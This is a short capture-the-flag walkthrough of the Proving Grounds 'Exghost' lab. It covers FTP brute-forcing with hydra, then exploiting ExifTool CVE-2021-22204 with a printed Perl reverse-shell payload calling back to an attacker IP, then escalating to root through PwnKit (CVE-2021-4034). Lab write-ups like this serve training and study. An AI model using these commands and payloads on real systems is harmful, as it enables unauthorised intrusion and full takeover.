# PG Practice: Exghost
https://medium.com/@vivek-kumar/offensive-security-proving-grounds-walk-through-exghost-2e9a969ef711
`export IP=192.168.70.183`

### All failed so go with Bruteforce
```
hydra -t 20 -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P password.txt -vV $IP ftp
```
I know ridiculous `user:system`

### ftp
```
❯ ftp $IP
Connected to 192.168.70.183.
220 (vsFTPd 3.0.3)
Name (192.168.70.183:alvin): user
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -alh
229 Entering Extended Passive Mode (|||43520|)
^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0          126151 Jan 27  2022 backup
226 Directory send OK.
ftp> get backup
local: backup remote: backup
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for backup (126151 bytes).
100% |***********************************************************************************************************************************************|   123 KiB  126.06 KiB/s    00:00 ETA
226 Transfer complete.
126151 bytes received in 00:01 (105.24 KiB/s)
```

### wireshark to the packet capture
```
POST /exiftest.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------169621313238602050593908562572
Content-Length: 14806
Origin: http://127.0.0.1
Connection: keep-alive
Referer: http://127.0.0.1/
Upgrade-Insecure-Requests: 1

-----------------------------169621313238602050593908562572
Content-Disposition: form-data; name="myFile"; filename="testme.jpg"           // <- myFile as the entry
Content-Type: image/jpeg
```
opening it with Wireshark to enumerate further. Filtering the HTTP packets, we see that someone uploaded an image to ip/exiftest.php and the upload was successful. We also can see the version of ExifTool running on the box.

Under `line-based text data` of the 200 response. File uploaded successfully :)<pre>ExifTool Version Number         : 12.23\n

### Let's try to upload a file
```
echo 'wqer 1234' > test01.txt

curl -F 'myFile=@test01.txt' -k http://192.168.70.183/exiftest.php
File not allowed.
```

### Exploit the exiftool by gooling its version
https://www.exploit-db.com/exploits/50911

```
❯ python3 exploit.py -s 192.168.49.70 7890

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(7890,inet_aton('192.168.49.70')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'
```
```
curl -F 'myFile=@image.jpg' -k http://192.168.70.183/exiftest.php
```

### Got the user.txt
##### linpeas
```
Vulnerable to CVE-2021-4034 # https://github.com/topics/cve-2021-4034

Vulnerable to CVE-2021-3560 # Not working, tried CVE-2021-3560-Polkit-Privilege-Esclation
```

###
There is no compiler installed on the machine. I cloned a few of the available exploits but any C code compiled on my system doesn’t seem to work on the target machine. Finding a python exploit for the same. And it works giving us a root shell. Refer: https://github.com/joeammond/CVE-2021-4034

# Sum up
Try python script when above issues happened
https://github.com/topics/cve-2021-4034

I found this one instead. https://github.com/A1vinSmith/CVE-2021-4034